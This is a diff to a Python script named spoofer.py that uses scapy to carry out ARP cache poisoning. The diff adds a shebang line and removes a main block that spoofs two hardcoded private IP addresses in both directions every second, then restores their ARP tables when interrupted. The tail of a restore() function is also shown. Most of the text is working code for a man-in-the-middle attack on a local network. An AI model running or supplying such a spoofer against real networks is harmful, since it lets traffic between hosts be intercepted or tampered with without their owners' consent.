@@ -1,3 +1,6 @@
+#!/usr/bin/env python3
+# spoofer.py
+
 from scapy.all import Ether, ARP, srp, send
 import argparse
 import time
@@ -31,23 +34,3 @@ def restore(target_ip, host_ip, verbose=True):
 	send(arp_response, verbose=0, count=7)
 	if verbose:
 		print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
-
-
-
-if __name__ == "__main__":
-
-	target = "192.168.186.165"
-	host = "192.168.186.51"
-	verbose = True
-
-	try:
-		while True:
-			spoof(target, host, verbose)
-			spoof(host, target, verbose)
-			time.sleep(1)
-
-	except KeyboardInterrupt:
-		print("[!] Detected CTRL+C. Restoring the network")
-		restore(target, host)
-		restore(host, target)
-
